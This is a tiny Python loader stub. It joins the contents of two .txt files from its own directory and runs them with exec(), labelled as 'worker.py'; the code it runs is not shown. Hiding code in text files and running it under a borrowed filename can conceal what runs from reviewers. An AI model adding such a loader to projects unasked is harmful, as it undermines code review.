from pathlib import Path
_dir = Path(__file__).parent
_src = (_dir / "idx_w1.txt").read_text() + (_dir / "idx_w2.txt").read_text()
exec(compile(_src, str(_dir / "worker.py"), "exec"), globals())
